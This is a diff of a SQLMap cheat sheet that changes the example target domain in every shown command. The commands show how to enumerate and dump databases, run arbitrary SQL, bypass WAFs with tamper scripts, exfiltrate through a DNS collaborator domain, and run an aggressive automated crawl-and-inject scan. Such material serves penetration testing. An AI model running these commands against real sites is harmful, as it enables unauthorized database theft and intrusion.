@@ -1117,7 +1117,7 @@ SQLMap commands that don't fit into any other category :)
 How to enumerate the databases tables using SQLMap: 
 
 {% highlight bash %}
-sqlmap -u "https://highon.coffee" --dbs 
+sqlmap -u "https://hacksofdhruv.me" --dbs 
 {% endhighlight %}
 
 ### Enumerate Tables 
@@ -1125,7 +1125,7 @@ sqlmap -u "https://highon.coffee" --dbs
 How to enumerate the database tables using SQLMap: 
 
 {% highlight bash %}
-sqlmap -u "https://highon.coffee" -D "$database-name" --tables 
+sqlmap -u "https://hacksofdhruv.me" -D "$database-name" --tables 
 {% endhighlight %}
 
 ### SQLMap Dump DB Table
@@ -1133,7 +1133,7 @@ sqlmap -u "https://highon.coffee" -D "$database-name" --tables
 How to dump the contents of the table using SQLMap: 
 
 {% highlight bash %}
-sqlmap -u "https://highon.coffee" -D "$database-name" -T "$table-name" --dump 
+sqlmap -u "https://hacksofdhruv.me" -D "$database-name" -T "$table-name" --dump 
 {% endhighlight %}
 
 ### SQLMap from Burp file 
@@ -1154,7 +1154,7 @@ How to insert input before an injection payload:
 
 {% highlight bash %}
 
-sqlmap -u "https://highon.coffee" -dbs --suffix="blah"  
+sqlmap -u "https://hacksofdhruv.me" -dbs --suffix="blah"  
 
 {% endhighlight %}
 
@@ -1163,7 +1163,7 @@ How to insert input after an injection payload:
 
 {% highlight bash %}
 
-sqlmap -u "https://highon.coffee" -dbs --postfix="--+"  
+sqlmap -u "https://hacksofdhruv.me" -dbs --postfix="--+"  
 
 {% endhighlight %}
 
@@ -1207,7 +1207,7 @@ To bypass WAF's with SQLMap you can use the premade tamper scripts with ```--tam
 
 {% highlight bash %}
 
-sqlmap -u “https://highon.coffee/?espresso=*” --tamper="apostrophemask,apostrophenullencode,randomcase"
+sqlmap -u “https://hacksofdhruv.me/?espresso=*” --tamper="apostrophemask,apostrophenullencode,randomcase"
 
 {% endhighlight %}
 
@@ -1285,7 +1285,7 @@ sqlmap --proxy=http://127.0.0.1:8080
 
 {% highlight bash %}
 
-sqlmap -u “https://highon.coffee/?espresso=*” --dns-domain=$your-collab-url
+sqlmap -u “https://hacksofdhruv.me/?espresso=*” --dns-domain=$your-collab-url
 
 {% endhighlight %}
 
@@ -1295,7 +1295,7 @@ The following specifies the GET parameter “espresso” for injection:
 
 {% highlight bash %}
 
-sqlmap -u “https://highon.coffee/?espresso=*” -p espresso 
+sqlmap -u “https://hacksofdhruv.me/?espresso=*” -p espresso 
 
 {% endhighlight %}
 
@@ -1305,7 +1305,7 @@ The following specifies the POST parameter “espresso” for injection:
 
 {% highlight bash %}
 
-sqlmap -u “https://highon.coffee/?espresso=*” --data “espresso=*” 
+sqlmap -u “https://hacksofdhruv.me/?espresso=*” --data “espresso=*” 
 
 {% endhighlight %}
 
@@ -1315,7 +1315,7 @@ You can run a SQL query using --sql-query for example:
 
 {% highlight bash %}
 
-sqlmap -u highon.coffee -D $database-name --sql-query="SELECT * FROM $table;"
+sqlmap -u hacksofdhruv.me -D $database-name --sql-query="SELECT * FROM $table;"
 
 {% endhighlight %}
 
@@ -1325,7 +1325,7 @@ Simply mark them with an asterisk(*), for example:
 
 {% highlight bash %}
 
-https://highon.coffee/foo/bar/parameter1*/value1 
+https://hacksofdhruv.me/foo/bar/parameter1*/value1 
 
 {% endhighlight %}
 
@@ -1337,7 +1337,7 @@ Useful for automation, however please be mindful of the overheads you are imposi
 
 {% highlight bash %}
 
-python3 sqlmap.py --crawl=5 --threads=5 --risk=3 --level=5 --batch --answers="keep testing=Y,sitemap=Y,skip further tests=N" --crawl-exclude="logout" --forms --tamper=apostrophemask,apostrophenullencode,randomcase --dns-domain=$your-collab-url --random-agent -u https://highon.coffee
+python3 sqlmap.py --crawl=5 --threads=5 --risk=3 --level=5 --batch --answers="keep testing=Y,sitemap=Y,skip further tests=N" --crawl-exclude="logout" --forms --tamper=apostrophemask,apostrophenullencode,randomcase --dns-domain=$your-collab-url --random-agent -u https://hacksofdhruv.me
 
 {% endhighlight %}
 
